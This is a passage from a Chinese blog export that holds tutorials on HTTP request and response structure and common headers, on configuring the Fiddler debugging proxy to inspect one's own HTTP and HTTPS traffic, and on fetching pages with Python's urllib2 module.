src=\"https://img-blog.csdnimg.cn/2019102317005777.jpg\" width=\"551\"></strong></p>\n\n<p> </p>\n\n<h3 id=\"浏览器发送http请求的过程：\">浏览器发送HTTP请求的过程：</h3>\n\n<ol><li>\n\t<p>当用户在浏览器的地址栏中输入一个URL并按回车键之后，浏览器会向HTTP服务器发送HTTP请求。HTTP请求主要分为“Get”和“Post”两种方法。</p>\n\t</li>\n\t<li>\n\t<p>当我们在浏览器输入URL <a href=\"http://www.baidu.com\" rel=\"nofollow\">http://www.baidu.com</a> 的时候，浏览器发送一个Request请求去获取 <a href=\"http://www.baidu.com\" rel=\"nofollow\">http://www.baidu.com</a> 的html文件，服务器把Response文件对象发送回给浏览器。</p>\n\t</li>\n\t<li>\n\t<p>浏览器分析Response中的 HTML，发现其中引用了很多其他文件，比如Images文件，CSS文件，JS文件。 浏览器会自动再次发送Request去获取图片，CSS文件，或者JS文件。</p>\n\t</li>\n\t<li>\n\t<p>当所有的文件都下载成功后，网页会根据HTML语法结构，完整的显示出来了。</p>\n\t</li>\n</ol><p>URL（Uniform / Universal Resource Locator的缩写）：统一资源定位符，是用于完整地描述Internet上网页和其他资源的地址的一种标识方法。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023170120286.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<p> </p>\n\n<p>基本格式：<code>scheme://host[:port#]/path/…/[?query-string][#anchor]</code></p>\n\n<ul><li>scheme：协议(例如：http, https, ftp)</li>\n\t<li>host：服务器的IP地址或者域名</li>\n\t<li>port#：服务器的端口（如果是走协议默认端口，缺省端口80）</li>\n\t<li>path：访问资源的路径</li>\n\t<li>query-string：参数，发送给http服务器的数据</li>\n\t<li>anchor：锚（跳转到网页的指定锚点位置）</li>\n</ul><p>例如：</p>\n\n<ul><li>\n\t<p><a href=\"ftp://192.168.0.116:8080/index\" rel=\"nofollow\">ftp://192.168.0.116:8080/index</a></p>\n\t</li>\n\t<li>\n\t<p><a href=\"http://www.baidu.com\" rel=\"nofollow\">http://www.baidu.com</a></p>\n\t</li>\n\t<li>\n\t<p><a href=\"http://item.jd.com/11936238.html#product-detail\" rel=\"nofollow\">http://item.jd.com/11936238.html#product-detail</a></p>\n\t</li>\n</ul><h1 id=\"客户端http请求\">客户端HTTP请求</h1>\n\n<p>URL只是标识资源的位置，而HTTP是用来提交和获取资源。客户端发送一个HTTP请求到服务器的请求消息，包括以下格式：</p>\n\n<p><code>请求行</code>、<code>请求头部</code>、<code>空行</code>、<code>请求数据</code></p>\n\n<p>四个部分组成，下图给出了请求报文的一般格式。</p>\n\n<p><img alt=\"\" class=\"has\" height=\"165\" src=\"https://img-blog.csdnimg.cn/20191023170147503.png\" width=\"466\"></p>\n\n<p> </p>\n\n<p>一个典型的HTTP请求示例</p>\n\n<pre class=\"has\">\n<code>GET https://www.baidu.com/ HTTP/1.1\nHost: www.baidu.com\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nReferer: http://www.baidu.com/\nAccept-Encoding: gzip, deflate, sdch, br\nAccept-Language: zh-CN,zh;q=0.8,en;q=0.6\nCookie: BAIDUID=04E4001F34EA74AD4601512DD3C41A7B:FG=1; BIDUPSID=04E4001F34EA74AD4601512DD3C41A7B; PSTM=1470329258; MCITY=-343%3A340%3A; BDUSS=nF0MVFiMTVLcUh-Q2MxQ0M3STZGQUZ4N2hBa1FFRkIzUDI3QlBCZjg5cFdOd1pZQVFBQUFBJCQAAAAAAAAAAAEAAADpLvgG0KGyvLrcyfrG-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFaq3ldWqt5XN; H_PS_PSSID=1447_18240_21105_21386_21454_21409_21554; BD_UPN=12314753; sug=3; sugstore=0; ORIGIN=0; bdime=0; H_PS_645EC=7e2ad3QHl181NSPbFbd7PRUCE1LlufzxrcFmwYin0E6b%2BW8bbTMKHZbDP0g; BDSVRTM=0\n</code></pre>\n\n<h2 id=\"请求方法\">请求方法</h2>\n\n<p><code>GET https://www.baidu.com/ HTTP/1.1</code></p>\n\n<p>根据HTTP标准，HTTP请求可以使用多种请求方法。</p>\n\n<p>HTTP 0.9：只有基本的文本 GET 功能。</p>\n\n<p>HTTP 1.0：完善的请求/响应模型，并将协议补充完整，定义了三种请求方法： GET, POST 和 HEAD方法。</p>\n\n<p>HTTP 1.1：在 1.0 基础上进行更新，新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>\n\n<p>HTTP 2.0（未普及）：请求/响应首部的定义基本没有改变，只是所有首部键必须全部小写，而且请求行要独立为 :method、:scheme、:host、:path这些键值对。</p>\n\n<table><thead><tr><th>序号</th>\n\t\t\t<th>方法</th>\n\t\t\t<th>描述</th>\n\t\t</tr></thead><tbody><tr><td>1</td>\n\t\t\t<td>GET</td>\n\t\t\t<td>请求指定的页面信息，并返回实体主体。</td>\n\t\t</tr><tr><td>2</td>\n\t\t\t<td>HEAD</td>\n\t\t\t<td>类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头</td>\n\t\t</tr><tr><td>3</td>\n\t\t\t<td>POST</td>\n\t\t\t<td>向指定资源提交数据进行处理请求（例如提交表单或者上传文件），数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。</td>\n\t\t</tr><tr><td>4</td>\n\t\t\t<td>PUT</td>\n\t\t\t<td>从客户端向服务器传送的数据取代指定的文档的内容。</td>\n\t\t</tr><tr><td>5</td>\n\t\t\t<td>DELETE</td>\n\t\t\t<td>请求服务器删除指定的页面。</td>\n\t\t</tr><tr><td>6</td>\n\t\t\t<td>CONNECT</td>\n\t\t\t<td>HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。</td>\n\t\t</tr><tr><td>7</td>\n\t\t\t<td>OPTIONS</td>\n\t\t\t<td>允许客户端查看服务器的性能。</td>\n\t\t</tr><tr><td>8</td>\n\t\t\t<td>TRACE</td>\n\t\t\t<td>回显服务器收到的请求，主要用于测试或诊断。</td>\n\t\t</tr></tbody></table><hr><h3 id=\"http请求主要分为get和post两种方法\">HTTP请求主要分为<code>Get</code>和<code>Post</code>两种方法</h3>\n\n<ul><li>\n\t<p>GET是从服务器上获取数据，POST是向服务器传送数据</p>\n\t</li>\n\t<li>\n\t<p>GET请求参数显示，都显示在浏览器网址上，HTTP服务器根据该请求所包含URL中的参数来产生响应内容，即“Get”请求的参数是URL的一部分。 例如： <code>http://www.baidu.com/s?wd=Chinese</code></p>\n\t</li>\n\t<li>\n\t<p>POST请求参数在请求体当中，消息长度没有限制而且以隐式的方式进行发送，通常用来向HTTP服务器提交量比较大的数据（比如请求中包含许多参数或者文件上传操作等），请求的参数包含在“Content-Type”消息头里，指明该消息体的媒体类型和编码，</p>\n\t</li>\n</ul><p><strong>注意：避免使用Get方式提交表单，因为有可能会导致安全问题。 比如说在登陆表单中用Get方式，用户输入的用户名和密码将在地址栏中暴露无遗。</strong></p>\n\n<h3 id=\"常用的请求报头\">常用的请求报头</h3>\n\n<h3 id=\"1-host-主机和端口号\">1. Host (主机和端口号)</h3>\n\n<p>Host：对应网址URL中的Web名称和端口号，用于指定被请求资源的Internet主机和端口号，通常属于URL的一部分。</p>\n\n<h3 id=\"2-connection-链接类型\">2. Connection (链接类型)</h3>\n\n<p>Connection：表示客户端与服务连接类型</p>\n\n<ol><li>\n\t<p>Client 发起一个包含 <code>Connection:keep-alive</code> 的请求，HTTP/1.1使用 <code>keep-alive</code> 为默认值。</p>\n\t</li>\n\t<li>\n\t<p>Server收到请求后：</p>\n\n\t<ul><li>如果 Server 支持 keep-alive，回复一个包含 Connection:keep-alive 的响应，不关闭连接；</li>\n\t\t<li>如果 Server 不支持 keep-alive，回复一个包含 Connection:close 的响应，关闭连接。</li>\n\t</ul></li>\n\t<li>\n\t<p>如果client收到包含 <code>Connection:keep-alive</code> 的响应，向同一个连接发送下一个请求，直到一方主动关闭连接。</p>\n\t</li>\n</ol><p><strong>keep-alive在很多情况下能够重用连接，减少资源消耗，缩短响应时间，比如当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都去请求建立连接。</strong></p>\n\n<h3 id=\"3-upgradeinsecurerequests-升级为https请求\">3. Upgrade-Insecure-Requests (升级为HTTPS请求)</h3>\n\n<p>Upgrade-Insecure-Requests：升级不安全的请求，意思是会在加载 http 资源时自动替换成 https 请求，让浏览器不再显示https页面中的http请求警报。</p>\n\n<p><strong><em>HTTPS 是以安全为目标的 HTTP 通道，所以在 HTTPS 承载的页面上不允许出现 HTTP 请求，一旦出现就是提示或报错。</em></strong></p>\n\n<h3 id=\"4-useragent-浏览器名称\">4. User-Agent (浏览器名称)</h3>\n\n<p>User-Agent：是客户浏览器的名称，以后会详细讲。</p>\n\n<h3 id=\"5-accept-传输文件类型\">5. Accept (传输文件类型)</h3>\n\n<p>Accept：指浏览器或其他客户端可以接受的MIME（Multipurpose Internet Mail Extensions（多用途互联网邮件扩展））文件类型，服务器可以根据它判断并返回适当的文件格式。</p>\n\n<p>举例：</p>\n\n<p><code>Accept: */*</code>：表示什么都可以接收。</p>\n\n<p><code>Accept：image/gif</code>：表明客户端希望接受GIF图像格式的资源；</p>\n\n<p><code>Accept：text/html</code>：表明客户端希望接受html文本。</p>\n\n<p><code>Accept: text/html, application/xhtml+xml;q=0.9, image/*;q=0.8</code>：表示浏览器支持的 MIME 类型分别是 html文本、xhtml和xml文档、所有的图像格式资源。</p>\n\n<p><strong><em>q是权重系数，范围 0 =&lt; q &lt;= 1，q 值越大，请求越倾向于获得其“;”之前的类型表示的内容。若没有指定q值，则默认为1，按从左到右排序顺序；若被赋值为0，则用于表示浏览器不接受此内容类型。</em></strong></p>\n\n<p><strong><em>Text：用于标准化地表示的文本信息，文本消息可以是多种字符集和或者多种格式的；Application：用于传输应用程序数据或者二进制数据。<a href=\"http://blog.sina.com.cn/s/blog_866e403f010179f1.html\" rel=\"nofollow\">详细请点击</a></em></strong></p>\n\n<h3 id=\"6-referer-页面跳转处\">6. Referer (页面跳转处)</h3>\n\n<p>Referer：表明产生请求的网页来自于哪个URL，用户是从该 Referer页面访问到当前请求的页面。这个属性可以用来跟踪Web请求来自哪个页面，是从什么网站来的等。</p>\n\n<p>有时候遇到下载某网站图片，需要对应的referer，否则无法下载图片，那是因为人家做了防盗链，原理就是根据referer去判断是否是本网站的地址，如果不是，则拒绝，如果是，就可以下载；</p>\n\n<h3 id=\"7-acceptencoding（文件编解码格式）\">7. Accept-Encoding（文件编解码格式）</h3>\n\n<p>Accept-Encoding：指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到Web响应之后先解码，然后再检查文件格式，许多情形下这可以减少大量的下载时间。</p>\n\n<p>举例：Accept-Encoding:gzip;q=1.0, identity; q=0.5, *;q=0</p>\n\n<p>如果有多个Encoding同时匹配, 按照q值顺序排列，本例中按顺序支持 gzip, identity压缩编码，支持gzip的浏览器会返回经过gzip编码的HTML页面。 <strong>如果请求消息中没有设置这个域服务器假定客户端对各种内容编码都可以接受。</strong></p>\n\n<h3 id=\"8-acceptlanguage（语言种类）\">8. Accept-Language（语言种类）</h3>\n\n<p>Accept-Langeuage：指出浏览器可以接受的语言种类，如en或en-us指英语，zh或者zh-cn指中文，当服务器能够提供一种以上的语言版本时要用到。</p>\n\n<h3 id=\"9-acceptcharset（字符编码）\">9. Accept-Charset（字符编码）</h3>\n\n<p>Accept-Charset：指出浏览器可以接受的字符编码。</p>\n\n<p>举例：Accept-Charset:iso-8859-1,gb2312,utf-8</p>\n\n<ul><li>ISO8859-1：通常叫做Latin-1。Latin-1包括了书写所有西方欧洲语言不可缺少的附加字符，英文浏览器的默认值是ISO-8859-1.</li>\n\t<li>gb2312：标准简体中文字符集;</li>\n\t<li>utf-8：UNICODE 的一种变长字符编码，可以解决多种语言文本显示问题，从而实现应用国际化和本地化。</li>\n</ul><p><strong>如果在请求消息中没有设置这个域，缺省是任何字符集都可以接受。</strong></p>\n\n<h3 id=\"10-cookie-（cookie）\">10. Cookie （Cookie）</h3>\n\n<p>Cookie：浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能，以后会详细讲。</p>\n\n<h3 id=\"11-contenttype-post数据类型\">11. Content-Type (POST数据类型)</h3>\n\n<p>Content-Type：POST请求里用来表示的内容类型。</p>\n\n<p>举例：Content-Type = Text/XML; charset=gb2312：</p>\n\n<p>指明该请求的消息体中包含的是纯文本的XML类型的数据，字符编码采用“gb2312”。</p>\n\n<h2 id=\"服务端http响应\">服务端HTTP响应</h2>\n\n<p>HTTP响应也由四个部分组成，分别是： <code>状态行</code>、<code>消息报头</code>、<code>空行</code>、<code>响应正文</code></p>\n\n<p><code><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023170306598.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></code></p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>HTTP/1.1 200 OK\nServer: Tengine\nConnection: keep-alive\nDate: Wed, 30 Nov 2016 07:58:21 GMT\nCache-Control: no-cache\nContent-Type: text/html;charset=UTF-8\nKeep-Alive: timeout=20\nVary: Accept-Encoding\nPragma: no-cache\nX-NWS-LOG-UUID: bd27210a-24e5-4740-8f6c-25dbafa9c395\nContent-Length: 180945\n\n&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" ....\n</code></pre>\n\n<h3 id=\"常用的响应报头了解\">常用的响应报头(了解)</h3>\n\n<p>理论上所有的响应头信息都应该是回应请求头的。但是服务端为了效率，安全，还有其他方面的考虑，会添加相对应的响应头信息，从上图可以看到：</p>\n\n<h3 id=\"1-cachecontrol：mustrevalidate-nocache-private。\">1. Cache-Control：must-revalidate, no-cache, private。</h3>\n\n<p>这个值告诉客户端，服务端不希望客户端缓存资源，在下次请求资源时，必须要从新请求服务器，不能从缓存副本中获取资源。</p>\n\n<ul><li>\n\t<p>Cache-Control是响应头中很重要的信息，当客户端请求头中包含Cache-Control:max-age=0请求，明确表示不会缓存服务器资源时,Cache-Control作为作为回应信息，通常会返回no-cache，意思就是说，\"那就不缓存呗\"。</p>\n\t</li>\n\t<li>\n\t<p>当客户端在请求头中没有包含Cache-Control时，服务端往往会定,不同的资源不同的缓存策略，比如说oschina在缓存图片资源的策略就是Cache-Control：max-age=86400,这个意思是，从当前时间开始，在86400秒的时间内，客户端可以直接从缓存副本中读取资源，而不需要向服务器请求。</p>\n\t</li>\n</ul><h3 id=\"2-connection：keepalive\">2. Connection：keep-alive</h3>\n\n<p>这个字段作为回应客户端的Connection：keep-alive，告诉客户端服务器的tcp连接也是一个长连接，客户端可以继续使用这个tcp连接发送http请求。</p>\n\n<h3 id=\"3-contentencodinggzip\">3. Content-Encoding:gzip</h3>\n\n<p>告诉客户端，服务端发送的资源是采用gzip编码的，客户端看到这个信息后，应该采用gzip对资源进行解码。</p>\n\n<h3 id=\"4-contenttype：texthtmlcharsetutf8\">4. Content-Type：text/html;charset=UTF-8</h3>\n\n<p>告诉客户端，资源文件的类型，还有字符编码，客户端通过utf-8对资源进行解码，然后对资源进行html解析。通常我们会看到有些网站是乱码的，往往就是服务器端没有返回正确的编码。</p>\n\n<h3 id=\"5-date：sun-21-sep-2016-061821-gmt\">5. Date：Sun, 21 Sep 2016 06:18:21 GMT</h3>\n\n<p>这个是服务端发送资源时的服务器时间，GMT是格林尼治所在地的标准时间。http协议中发送的时间都是GMT的，这主要是解决在互联网上，不同时区在相互请求资源的时候，时间混乱问题。</p>\n\n<h3 id=\"6-expiressun-1-jan-2000-010000-gmt\">6. Expires:Sun, 1 Jan 2000 01:00:00 GMT</h3>\n\n<p>这个响应头也是跟缓存有关的，告诉客户端在这个时间前，可以直接访问缓存副本，很显然这个值会存在问题，因为客户端和服务器的时间不一定会都是相同的，如果时间不同就会导致问题。所以这个响应头是没有Cache-Control：max-age=*这个响应头准确的，因为max-age=date中的date是个相对时间，不仅更好理解，也更准确。</p>\n\n<h3 id=\"7-pragmanocache\">7. Pragma:no-cache</h3>\n\n<p>这个含义与Cache-Control等同。</p>\n\n<h3 id=\"8server：tengine146\">8.Server：Tengine/1.4.6</h3>\n\n<p>这个是服务器和相对应的版本，只是告诉客户端服务器的信息。</p>\n\n<h3 id=\"9-transferencoding：chunked\">9. Transfer-Encoding：chunked</h3>\n\n<p>这个响应头告诉客户端，服务器发送的资源的方式是分块发送的。一般分块发送的资源都是服务器动态生成的，在发送时还不知道发送资源的大小，所以采用分块发送，每一块都是独立的，独立的块都能标示自己的长度，最后一块是0长度的，当客户端读到这个0长度的块时，就可以确定资源已经传输完了。</p>\n\n<h3 id=\"10-vary-acceptencoding\">10. Vary: Accept-Encoding</h3>\n\n<p>告诉缓存服务器，缓存压缩文件和非压缩文件两个版本，现在这个字段用处并不大，因为现在的浏览器都是支持压缩的。</p>\n\n<h2 id=\"响应状态码\">响应状态码</h2>\n\n<p>响应状态代码有三位数字组成，第一个数字定义了响应的类别，且有五种可能取值。</p>\n\n<p>常见状态码：</p>\n\n<ul><li>\n\t<p><code>100~199</code>：表示服务器成功接收部分请求，要求客户端继续提交其余请求才能完成整个处理过程。</p>\n\t</li>\n\t<li>\n\t<p><code>200~299</code>：表示服务器成功接收请求并已完成整个处理过程。常用200（OK 请求成功）。</p>\n\t</li>\n\t<li><code>300~399</code>：为完成请求，客户需进一步细化请求。例如：请求的资源已经移动一个新地址、常用302（所请求的页面已经临时转移至新的url）、307和304（使用缓存资源）。</li>\n\t<li><code>400~499</code>：客户端的请求有错误，常用404（服务器无法找到被请求的页面）、403（服务器拒绝访问，权限不够）。</li>\n\t<li><code>500~599</code>：服务器端出现错误，常用500（请求未完成。服务器遇到不可预知的情况）。</li>\n</ul><h2 id=\"cookie-和-session：\">Cookie 和 Session：</h2>\n\n<p>服务器和客户端的交互仅限于请求/响应过程，结束之后便断开，在下一次请求时，服务器会认为新的客户端。</p>\n\n<p>为了维护他们之间的链接，让服务器知道这是前一个用户发送的请求，必须在一个地方保存客户端的信息。</p>\n\n<p><strong>Cookie</strong>：通过在 客户端 记录的信息确定用户的身份。</p>\n\n<p><strong>Session</strong>：通过在 服务器端 记录的信息确定用户的身份。</p>\n                                    </div>", "log_PostTime": 1584891184, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "HTTP/HTTPS抓包工具-Fiddler", "log_Intro": "HTTP/HTTPS抓包工具-Fiddler", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"http代理神器fiddler\">HTTP代理神器Fiddler</h1>\n\n<p>Fiddler是一款强大Web调试工具，它能记录所有客户端和服务器的HTTP请求。 Fiddler启动的时候，默认IE的代理设为了127.0.0.1:8888，而其他浏览器是需要手动设置。</p>\n\n<h2 id=\"工作原理\">工作原理</h2>\n\n<p>Fiddler 是以代理web服务器的形式工作的，它使用代理地址：127.0.0.1，端口：8888</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172411487.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<h2 id=\"fiddler抓取https设置\">Fiddler抓取HTTPS设置</h2>\n\n<ol><li>\n\t<p>启动Fiddler，打开菜单栏中的 Tools &gt; Telerik Fiddler Options，打开“Fiddler Options”对话框。</p>\n\n\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172436316.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t<p> </p>\n\t</li>\n\t<li>\n\t<p>对Fiddler进行设置：</p>\n\n\t<ul><li>打开工具栏-&gt;Tools-&gt;Fiddler Options-&gt;HTTPS，</li>\n\t\t<li>选中Capture HTTPS CONNECTs (捕捉HTTPS连接)，</li>\n\t\t<li>选中Decrypt HTTPS traffic（解密HTTPS通信）</li>\n\t\t<li>另外我们要用Fiddler获取本机所有进程的HTTPS请求，所以中间的下拉菜单中选中...from all processes （从所有进程）</li>\n\t\t<li>\n\t\t<p>选中下方Ignore server certificate errors（忽略服务器证书错误）</p>\n\n\t\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172500408.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t\t<p> </p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>为 Fiddler 配置Windows信任这个根证书解决安全警告：Trust Root Certificate（受信任的根证书）。</p>\n\n\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172529340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t<p> </p>\n\t</li>\n\t<li>\n\t<p>Fiddler 主菜单 Tools -&gt; Fiddler Options…-&gt; Connections</p>\n\n\t<ul><li>选中Allow remote computers to connect（允许远程连接）</li>\n\t\t<li>\n\t\t<p>Act as system proxy on startup（作为系统启动代理）</p>\n\n\t\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172547842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t\t<p> </p>\n\t\t</li>\n\t</ul></li>\n\t<li>\n\t<p>重启Fiddler，使配置生效（这一步很重要，必须做）。</p>\n\t</li>\n</ol><h2 id=\"fiddler-如何捕获chrome的会话\">Fiddler 如何捕获Chrome的会话</h2>\n\n<ol><li>\n\t<p>安装SwitchyOmega 代理管理 Chrome 浏览器插件</p>\n\n\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172605229.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t<p> </p>\n\t</li>\n\t<li>\n\t<p>如图所示，设置代理服务器为127.0.0.1:8888</p>\n\n\t<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172636598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n\t<p> </p>\n\t</li>\n\t<li>\n\t<p>通过浏览器插件切换为设置好的代理。</p>\n\n\t<p> </p>\n\t</li>\n</ol><p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/2019102317265636.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<h2 id=\"fiddler界面\">Fiddler界面</h2>\n\n<p>设置好后，本机HTTP通信都会经过127.0.0.1:8888代理，也就会被Fiddler拦截到。</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20191023172716572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"> </p>\n\n<p> </p>\n\n<p>请求 (Request) 部分详解</p>\n\n<blockquote>\n<ol><li>Headers —— 显示客户端发送到服务器的 HTTP 请求的 header，显示为一个分级视图，包含了 Web 客户端信息、Cookie、传输状态等。</li>\n\t<li>Textview —— 显示 POST 请求的 body 部分为文本。</li>\n\t<li>WebForms —— 显示请求的 GET 参数 和 POST body 内容。</li>\n\t<li>HexView —— 用十六进制数据显示请求。</li>\n\t<li>Auth —— 显示响应 header 中的 Proxy-Authorization(代理身份验证) 和 Authorization(授权) 信息.</li>\n\t<li>Raw —— 将整个请求显示为纯文本。</li>\n\t<li>JSON - 显示JSON格式文件。</li>\n\t<li>XML —— 如果请求的 body 是 XML 格式，就是用分级的 XML 树来显示它。</li>\n</ol></blockquote>\n\n<p>响应 (Response) 部分详解</p>\n\n<blockquote>\n<ol><li>Transformer —— 显示响应的编码信息。</li>\n\t<li>Headers —— 用分级视图显示响应的 header。</li>\n\t<li>TextView —— 使用文本显示相应的 body。</li>\n\t<li>ImageVies —— 如果请求是图片资源，显示响应的图片。</li>\n\t<li>HexView —— 用十六进制数据显示响应。</li>\n\t<li>WebView —— 响应在 Web 浏览器中的预览效果。</li>\n\t<li>Auth —— 显示响应 header 中的 Proxy-Authorization(代理身份验证) 和 Authorization(授权) 信息。</li>\n\t<li>Caching —— 显示此请求的缓存信息。</li>\n\t<li>Privacy —— 显示此请求的私密 (P3P) 信息。</li>\n\t<li>Raw —— 将整个响应显示为纯文本。</li>\n\t<li>JSON - 显示JSON格式文件。</li>\n\t<li>XML —— 如果响应的 body 是 XML 格式，就是用分级的 XML 树来显示它 。</li>\n</ol></blockquote>\n                                    </div>", "log_PostTime": 1584891185, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Python：urllib2模块的基本使用", "log_Intro": "Python：urllib2模块的基本使用", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1 id=\"urllib2库的基本使用\">urllib2库的基本使用</h1>\n\n<p>所谓网页抓取，就是把URL地址中指定的网络资源从网络流中读取出来，保存到本地。 在Python中有很多库可以用来抓取网页，我们先学习<code>urllib2</code>。</p>\n\n<blockquote>\n<p>urllib2 是 Python2.7 自带的模块(不需要下载，导入即可使用)</p>\n\n<p>urllib2 官方文档：<a href=\"https://docs.python.org/2/library/urllib2.html\" rel=\"nofollow\">https://docs.python.org/2/library/urllib2.html</a></p>\n\n<p>urllib2 源码：<a href=\"https://hg.python.org/cpython/file/2.7/Lib/urllib2.py\" rel=\"nofollow\">https://hg.python.org/cpython/file/2.7/Lib/urllib2.py</a></p>\n</blockquote>\n\n<p><strong><em><code>urllib2</code> 在 python3.x 中被改为<code>urllib.request</code></em></strong></p>\n\n<h2 id=\"urlopen\">urlopen</h2>\n\n<p>我们先来段代码：</p>\n\n<pre class=\"has\">\n<code># urllib2_urlopen.py\n\n# 导入urllib2 库\nimport urllib2\n\n# 向指定的url发送请求，并返回服务器响应的类文件对象\nresponse = urllib2.urlopen(\"http://www.baidu.com\")\n\n# 类文件对象支持 文件对象的操作方法，如read()方法读取文件全部内容，返回字符串\nhtml = response.read()\n\n# 打印字符串\nprint html\n</code></pre>\n\n<p>执行写的python代码，将打印结果</p>\n\n<pre class=\"has\">\n<code>Power@PowerMac ~$: python urllib2_urlopen.py\n</code></pre>\n\n<p><strong>实际上，如果我们在浏览器上打开百度主页， 右键选择“查看源代码”，你会发现，跟我们刚才打印出来的是一模一样。也就是说，上面的4行代码就已经帮我们把百度的首页的全部代码爬了下来。</strong></p>\n\n<p><strong>一个基本的url请求对应的python代码真的非常简单。</strong></p>\n\n<h2 id=\"request\">Request</h2>\n\n<p>在我们第一个例子里，urlopen()的参数就是一个url地址；</p>\n\n<p>但是如果需要执行更复杂的操作，比如增加HTTP报头，必须创建一个 Request 实例来作为urlopen()的参数；而需要访问的url地址则作为 Request 实例的参数。</p>\n\n<p>我们编辑urllib2_request.py</p>\n\n<pre class=\"has\">\n<code># urllib2_request.py\n\nimport urllib2\n\n# url 作为Request()方法的参数，构造并返回一个Request对象\nrequest = urllib2.Request(\"http://www.baidu.com\")\n\n# Request对象作为urlopen()方法的参数，发送给服务器并接收响应\nresponse = urllib2.urlopen(request)\n\nhtml = response.read()\n\nprint html\n</code></pre>\n\n<p>运行结果是完全一样的：</p>\n\n<blockquote>\n<p>新建Request实例，除了必须要有 url 参数之外，还可以设置另外两个参数：</p>\n\n<ol><li>\n\t<p>data（默认空）：是伴随 url 提交的数据（比如要post的数据），同时 HTTP 请求将从 \"GET\"方式 改为 \"POST\"方式。</p>\n\t</li>\n\t<li>\n\t<p>headers（默认空）：是一个字典，包含了需要发送的HTTP报头的键值对。</p>\n\t</li>\n</ol><p>这两个参数下面会说到。</p>\n</blockquote>\n\n<h2 